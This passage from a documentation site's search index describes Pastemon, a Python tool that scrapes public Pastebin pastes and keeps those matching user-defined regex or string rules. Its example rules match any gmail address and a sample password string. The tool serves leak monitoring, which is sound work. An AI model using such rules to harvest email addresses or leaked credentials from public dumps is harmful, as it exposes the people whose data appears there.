parts of the condition that are going to be actually checked. The list of possible parameters up to date are: \n\n\nregex\n: If you want to match some regex. (Only one per condition, can't be used with string in the same condition)\n\n\nstring\n: If you want to match a fixed string. (Only one per condition, can't be used with regex in the same condition)\n\n\nicase\n: True or False. If True, the match is case insensitive. By default, is False.\n\n\ntimes\n: A Natural number. Amount of time that the string/regex should match. By default, 1. \n\n\n\n\n\n\n\n\nTake into account that backslashes \"\\\" must be escaped!!!!!\n\n\nBesides the framework itself, a separate script called \ntester.py\n is shipped. This script allows you to manually/quick understand against which conditions/rules a certain \"pastebin\" will match: \n\n\npython tester.py -c test.yaml -p test.pastebin\n\n\n\n\nTo see a complete example, head to the next section\n\n\nExample\n\n\npython pastemon.py -r analysis -o output -c example.yaml\n\n\n\n\nany_gmail_email:\n    regex: \n[^@\\\\s]+@gmail.com\n\n    icase: True\n\nmy_name:\n    string: \nlmkalg\n\n    icase: True\n    times: 5\n\nmy_password:\n    string: \n34syP4ssW0rd1234\n\n\n\n\n\nDeeper description:\n1. The first condition named \n\"any_gmail_email\"\n will match only when the an email of the gmail domain (no matter the case) is present in the pastebin. In positive case, it will store the pastebin inside the \noutput/any_gmail_email/\n directory.\n2. The second condition named \n\"my_name\"\n will match only when the string \n\"lmkalg\"\n (no matter the case) is present more than 5 times inside the pastebin. In positive case, it will store the pastebin inside the \noutput/my_name/\n directory.\n3. The third and last condition named \n\"my_password\"\n will match only when the string \n\"34syP4ssW0rd1234\"\n appears in the pastebin exactly with the same case each letter. If only one of them differs, the match won't occur. In positive case, it will store the pastebin inside the \noutput/my_password/\n directory.\n\n\nFuture work\n\n\n\n\nBe able to match more than one string/regex in the same condition (near future)\n\n\nBe able to monitor by user.\n\n\nExtend not only to pastebin, but also to another sources.", 
            "title": "Pastemon"
        }, 
        {
            "location": "/tiny_tools/pastemon/#pastemon", 
            "text": "", 
            "title": "Pastemon"
        }, 
        {
            "location": "/tiny_tools/pastemon/#description", 
            "text": "Pastemon is a python3-based multiprocess framework aim to allow you monitor the public pastebins that are continuously uploaded to https://pastebin.com.\nIt allows you to match content inside the pastes based on rules written by the user. So far, you are able to match fixed strings or regexes. If some of the rules defined matches, the entire pastebin is stored.  Very interesting stuff can be found. Start thining on cool regexes ;).", 
            "title": "Description"
        }, 
        {
            "location": "/tiny_tools/pastemon/#sourcecode", 
            "text": "The source code can be find in https://github.com/lmkalg/pastemon", 
            "title": "Sourcecode"
        }, 
        {
            "location": "/tiny_tools/pastemon/#requirements", 
            "text": "Pastemon makes use of the  scrapping interface  provided by Pastebin. In order to use it, you should whitelist your IP. Therefore, to use Pastemon, you should have a PRO account in Pastebin, otherwise your IP will be blocked after a few seconds.   The necessary libraries in order to run this tool, are written down in the  requirements.txt .", 
            "title": "Requirements"
        }, 
        {
            "location": "/tiny_tools/pastemon/#install", 
            "text": "To install the tools and necessary libraries, it's recommended to use a particular virtual env:   virtualenv pastemon -p python3\nsource pastemon/bin/activate\ncd pastemon\npip install -r requirements.txt\npython pastemon.py ARGUMENTS", 
            "title": "Install"
        }, 
        {
            "location": "/tiny_tools/pastemon/#how-to-use-it", 
            "text": "usage: pastemon.py [-h] [-d DOWNLOADERS] [-g GETTERS] [-a ANALYZERS]\n                          [-s STORERS] [-r ANALYSIS_DIR_PATH]\n                          [-o OUTPUT_DIR_PATH] [-c CONDITIONS_FILE_PATH]\n                          [-t TIME_TO_WAIT] [-n AMOUNT_OF_PASTES_TO_FETCH]\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -d DOWNLOADERS        Amount of downloaders (will download the pastebin\n                        content)\n  -g GETTERS            Amount of getters (will check for new pastebins)\n  -a ANALYZERS          Amount of analyzers (will analyze the pastebin's\n                        content)\n  -s STORERS            Amount of storers (will either store or delete a\n                        pastebin)\n  -r ANALYSIS_DIR_PATH  Path to store the pastes to be analyzed (temporary)\n  -o OUTPUT_DIR_PATH    Path to store the pastes that accomplished some\n                        condition\n  -c CONDITIONS_FILE_PATH\n                        Path to the YAML conditions file\n  -t TIME_TO_WAIT       Amount of time (in secs) to wait between each time it\n                        goes for new pastes. Suggested and default (180)\n  -n AMOUNT_OF_PASTES_TO_FETCH\n                        Amount of pastes to fetch each time it goes for new\n                        pastes. Maximun and default is 250", 
            "title": "How to use it"
        }, 
        {
            "location": "/tiny_tools/pastemon/#how-does-it-work", 
            "text": "If you are interested in the full architecture of the tool, here you'll find a detailed description:  \nAs it is depicted in the picture, there are several components involves in the framework:    Pastebin Server : This is the only thing that is not controlled by the user. It represents the host where the pastebins are uploaded.    Redis : A  redis  instance with couple of queues to deal with the async between several processes.   Storage : This is any storage chosen by the user, used to store each pastebin either temporary or definitively (if it matches some rule).   Pastebin Monitor : The actual and initial Python script (pastemon.py) which received the arguments to configure the whole tool.   Conditions definition file : A  .yaml  file where the rules/conditions are defined.   Orchestrator : Naive Python object in charge of initializing the rest objects and validating the input.    Getters : Python objects in charge of pulling ONLY the new pastes (if there are) and pushing the data related to them (URL, name, etc) to the  Pastes data queue .   Downloaders : Python objects in charge of pulling the corresponding data of each new pastebin from the  pastes data queue , to later download the actual content of each of them. Once the contest is downloaded, it is stored in the  Storage  (in particular in the  Analysis Directory , flag  -r ), the related info (path to the storage) is pushed to the  Pastes to analyze queue . Analyzers : Python objects in charge of analyzing the actual content (after getting the path \nfrom the  Pastes to analyze queue ). If there is rule that matches, the path to it togeteher with the action that should be carried out (either store it or delete it) is pushed to the  Storers queue . Storers : Python objects in charge of either deleting the patebins that didn't match or moving them in the corresponding directory. For each condition/rule defined a directory, inside the output directory provided as parameter, is created.", 
            "title": "How does it work"
        }, 
        {
            "location": "/tiny_tools/pastemon/#defining-rules-conditions", 
            "text": "In order to write new rules/conditions to be matched, a  .yaml  file with the following structure should be provided:  [cond1]:\n    [match_cond_1_1]\n    [match_cond_1_2]\n    ...\n\n[cond2]:\n    [match_cond_2_1]\n    [match_cond_2_2]\n    ...\n...\n[condn]:\n    [match_cond_n_1]\n    [match_cond_n_2]\n    ...   [condX] : Will be used as the name of the rule/condition, therefore it will exist a directory with this name where all the matched pastebins will be placed.  [match_cond_X_Y] : WIll be each of the parts of the condition that are going to be actually checked. The list of possible parameters up to date are:   regex : If you want to match some regex. (Only one per condition, can't be used with string in the same condition)  string : If you want to match a fixed string. (Only one per condition, can't be used with regex in the same condition)  icase : True or False. If True, the match is case insensitive. By default, is False.  times : A Natural number. Amount of time that the string/regex should match. By default, 1.      Take into account that backslashes \"\\\" must be escaped!!!!!  Besides the framework itself, a separate script called  tester.py  is shipped. This script allows you to manually/quick understand against which conditions/rules a certain \"pastebin\" will match:   python tester.py -c test.yaml -p test.pastebin  To see a complete example, head to the next section", 
            "title": "Defining rules / conditions"
        }, 
        {
            "location": "/tiny_tools/pastemon/#example", 
            "text": "python pastemon.py -r analysis -o output -c example.yaml  any_gmail_email:\n    regex:  [^@\\\\s]+@gmail.com \n    icase: True\n\nmy_name:\n    string:  lmkalg \n    icase: True\n    times: 5\n\nmy_password:\n    string:  34syP4ssW0rd1234   Deeper description:\n1. The first condition named  \"any_gmail_email\"  will match only when the an email of the gmail domain (no matter the case) is present in the pastebin. In positive case, it will store the pastebin inside the  output/any_gmail_email/  directory.\n2. The second condition named  \"my_name\"  will match only when the string  \"lmkalg\"  (no matter the case) is present more than 5 times inside the pastebin. In positive case, it will store the pastebin inside the  output/my_name/  directory.\n3. The third and last condition named  \"my_password\"  will match only when the string  \"34syP4ssW0rd1234\"  appears in the pastebin exactly with the same case each letter. If only one of them differs, the match won't occur. In positive case, it will store the pastebin inside the  output/my_password/  directory.", 
            "title": "Example"
        }, 
        {
            "location": "/tiny_tools/pastemon/#future-work", 
            "text": "Be able to match more than one string/regex in the same condition (near future)  Be able to monitor by user.  Extend not only to pastebin, but also to another sources.", 
            "title": "Future work"
        }, 
        {
            "location": "/arduino/robot/", 
            "text": "Coming Soon..", 
            "title": "Robot"
        }, 
        {
            "location": "/arduino/robot/#coming-soon", 
            "text": "", 
            "title": "Coming Soon.."
        }, 
        {
            "location": "/etw/introduction/", 
            "text": "Coming Soon..", 
            "title": "Introduction"
        }, 
        {
            "location": "/etw/introduction/#coming-soon", 
            "text": "", 
            "title": "Coming Soon.."
        }
    ]
}